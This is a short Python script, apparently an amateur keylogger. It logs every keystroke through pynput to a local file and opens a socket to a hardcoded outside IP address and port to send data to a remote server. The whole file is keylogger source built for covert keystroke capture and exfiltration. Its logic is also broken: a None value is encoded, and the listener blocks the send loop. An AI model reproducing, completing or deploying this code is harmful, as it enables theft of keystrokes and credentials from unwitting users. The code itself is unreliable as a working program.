import socket

# library
from pynput.keyboard import Key, Listener
#vanilla
import logging 

# make a log file
log_directory = ""

newstr = logging.basicConfig(filename=(log_directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    # if key == Key.escape:
        #return false

#create the socket again
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#create variable for server address
serverAddress = ("129.21.84.234", 10002)
#connect to server and print that you are connecting
print('Connecting to %s port %s' % serverAddress)
sock.connect(serverAddress)

#turn string into bytes by encoding or else it will pop an error saying it expected bytes
# newstr = input("String to send: ")
while newstr != "":
    newstr_bytes = newstr.encode()
    print(newstr_bytes)
    try:
        #Send data with (sendall)
        message = newstr_bytes
        print('Sending "%s"' % message)
        sock.sendall(message)

        #Look for the response
        amount_received = 0
        amount_expected = len(message)
        
        while amount_received < amount_expected:
            data = sock.recv(16)
            amount_received += len(data)
            print(f'Received {newstr_bytes.decode()}')
        with Listener(on_press=on_press) as listener:
            listener.join()
    finally:
        newstr = input("String to send: ")
print ('Closing socket')
sock.close()